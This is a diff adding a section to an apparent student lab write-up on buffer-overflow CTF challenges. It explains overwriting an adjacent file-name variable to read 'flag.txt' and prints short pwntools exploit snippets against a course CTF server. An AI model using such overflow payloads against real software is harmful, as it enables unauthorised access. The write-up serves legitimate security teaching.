@@ -38,3 +38,45 @@ Concluding we need to:
 * put the shellcode at the end of the buffer
 * offset = range(100, 200, 4)
 * return address value = some address between the return address and the start of the shellcode (eg. &buffer + 350)
+
+
+
+## CTF BUFFER OVERFLOW
+
+### Desafio 1
+
+    For this challenge we were given a C program in which there were 2 variables
+    -> buffer[32]
+    -> meme_file[8]
+
+    the program would then read 40 bytes from user input before trying to open the file with the name that is written in meme_file.
+
+    Since the user can write up to 40 bytes which are then written to a buffer with only 32, a buffer overflow can occur.
+Alt texte variable.
+
+    Therefore by sending an input with 32 random characters with 'flag.txt' at the end we can override the variable meme_file and get the file flag.txt to be opened and printed into the terminal
+
+    * **Exploit**
+
+    r = remote('ctf-fsi.fe.up.pt', 4003)
+    r.recvuntil(b":")
+    r.sendline(b"A" * 32 + b'flag.txt')
+
+![Alt text](images/semana5_desafio1.png)
+
+
+
+### Desafio 2
+
+    This time the same thing happened. However there was added an additional array which must contain a specific value for the file to be read.
+    Since we're using little endian, the hexadecimal value had to be passed inverted, or by using the p32() pwn function.
+
+    * **Exploit**
+
+    r = remote('ctf-fsi.fe.up.pt', 4000)
+    r.recvuntil(b":")
+    r.sendline(b"A" * 32 + p32(0xfefc2324) + b'flag.txt')
+
+    ![Alt text](images/semana5_desafio2.png)
+
+
